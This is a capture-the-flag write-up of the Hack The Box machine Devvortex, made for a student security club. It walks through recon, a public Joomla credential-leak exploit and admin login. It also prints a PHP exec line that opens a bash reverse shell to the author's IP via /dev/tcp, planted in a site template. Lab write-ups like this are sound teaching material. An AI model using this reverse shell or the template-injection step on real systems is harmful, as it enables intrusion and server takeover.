# Devvortex-Writeup
A write-up of the Hack The Box devvortex machine for the TAMU Cybersecurity Club 

## Recon
`nmap` scan reveals that ports 22 (SSH) and 80 (HTTP) are open. Additionally, the scan shows a redirect to `http://devvortex.htb/`

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/beada65f-3404-49fa-9ebe-b00fb4982f54)

I add `devvortex.htb` to my `/etc/hosts` file

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/a4f886be-9d0e-42ef-aae8-c7622ad3ede9)

## Site "devvortex.htb"
Visitng `http://devvortex.htb`, we are met with this site:

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/976241ac-2107-46f0-bf0f-d2f9d2d9cba2)

First, I look for `robots.txt`, but this site appears to not have one:

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/1b2d6a03-f35d-4d0e-bd9b-8f07f8995dcd)

Second, I try to find anywhere on the site with user input, which is found in the "Contact Us" page of the website:

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/6d027f99-e7a6-49cb-aa7d-f0c22bd690a7)

After filling in the fields with some fuzz input, like an apostrophe, it becomes clear that clicking "send" only refreshes the page and doesn't actually do anything.

With the "Contact Us" page leading nowhere, I begin to search for directories using `gobuster`, which doesn't find anything out of the ordinary:

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/46e154ba-13f7-441c-b042-7707821790a9)

Next, still using `gobuster`, I search for any vhosts, which finds the domain, `dev.devvortex.htb`:

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/a481b535-33bf-43d3-b1a6-fdda662c2d2b)

I add the domain to my `/etc/hosts` file:

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/d6400e15-1ca7-4de6-b65e-3f3bc16a780c)

# Site "dev.devvortex.htb"

Visiting `dev.devvortex.htb`, we are met with this site:

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/c0ad3092-4fcb-4863-8a94-11eac46b86e8)

Clicking around, there doesn't seem to be any page on the site that accepts user input. I check to see if this site has a `robots.txt` file, which it does:

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/513692e2-9bc0-47c8-ae21-7085c657c253)

There is mention to something called `joomla`, but what intrigues me the most is the `administrator` directory. Let's visit it.

Taking a look at the `administrator` directory, we are met with a `joomla` administrator log in page:

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/85755bf8-826e-4b18-9cf2-db24ab94bc17)

Before fuzzing the log in, I first google to see if there are any exploits for joomla, and I do find an exploit on exploit-db [here](https://www.exploit-db.com/exploits/51334)

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/4f16fb3b-9e1a-426f-ade7-f67da3be428a)

Its an exploit written in ruby. I create a file, `joomla-exploit`, paste the code in, and run it. The file requires one argument, which is the URL of the website. The exploit works, and provides me with information about the database used, but more importantly, log in credentials:

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/ea6d751c-c497-496d-8c46-2bb8253348f7)

I attempt to use these credentials to log in to the `lewis` user via SSH, but no dice:

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/256065f6-8521-461d-9c23-fa203153ad94)

I then use these crednetials on the log in page found earlier, and I'm logged in:

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/3beb8247-b2df-49a5-a490-1daf2199be42)

# Joomla Dashboard and Reverse Shell

I click around trying to see if there's anything that can lead me to the log in credentials of other users, but I find nothing. Eventually, I finally come across something interesting (which took longer than I'd care to admit)

Found in the `System` tab, under Templates, is `Administrator Templates`:

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/d6d4249b-1314-4037-a67b-1dee35c08089)

Clicking here leads us to the server side code of the administrator part of the site, and we can edit it!:

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/89b39c08-9cdd-4a39-847c-fa5d5ed64347)

Bingo. From here, we can code in some php that will establish a reverse shell, which can grant us access to the devvortex server itself

On my system, I create a listener on port 69:

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/6796b174-f024-468f-ba40-89cb1b41cd73)

Back on the devvortex system, I add the line `exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.4/69 0>&1'");`, with `10.10.16.4` being my system's IP:

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/46054c87-6b9e-42d8-b9b9-f686fc0709f4)

I save the file, and back on my system, I get a connection and I now have access onto the devvortex server itself:

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/e03da5be-3d6a-4c5e-9434-445e56574380)

# Shell as www-data

First things first, I check to see if the server has python3, which I then use to stabilize the shell using the commands

`python3 -c "import pty;pty.spawn('/bin/bash')"
 export TERM=xterm
 CTRL + Z
 stty raw -echo; fg
`

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/13c9ef47-316b-4cb9-8389-5ae8cace4854)
